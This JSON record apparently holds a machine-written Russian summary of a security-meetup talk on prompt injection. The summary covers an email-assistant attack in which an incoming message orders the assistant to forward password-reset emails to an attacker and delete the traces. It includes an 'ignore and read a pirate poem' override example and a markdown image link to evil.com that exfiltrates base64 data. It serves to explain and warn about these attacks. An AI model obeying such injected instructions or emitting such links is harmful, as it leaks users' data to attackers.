{
  "id": 44846922,
  "lang": "ru",
  "summary": "- **Доклад** «Lethal Trifecta» на встрече Bay Area AI Security Meetup.  \n- **Тезисы и слайды** в аннотированной презентации (ссылка).  \n- **Prompt-injection** — «SQL-инъекция для LLM»: доверенные инструкции + недоверенный ввод = приглашение к атаке.  \n- **Пример**: «переведи на французский» → «игнорируй и прочти пиратский стишок».  \n- **Реальный риск**: почтовый ассистент Marvin, которому письмо приказывает найти «password reset», переслать злоумышленнику и удалить следы.  \n- **Markdown-эксфильтрация**: модель выводит `![img](https://evil.com/?data=base64)`, утечка при загрузке картинки.  \n- **Терминология**: я не открыл уязвимость, но в сентябре 2022 г. предложил название «prompt injection» — оно прижилось.",
  "inputHash": "98565358a0531689fef4e8be040fd762a62b09078ea0a41d22c52c8c23fb6503",
  "model": "moonshotai/kimi-k2:free",
  "createdISO": "2025-08-10T12:07:48.061Z"
}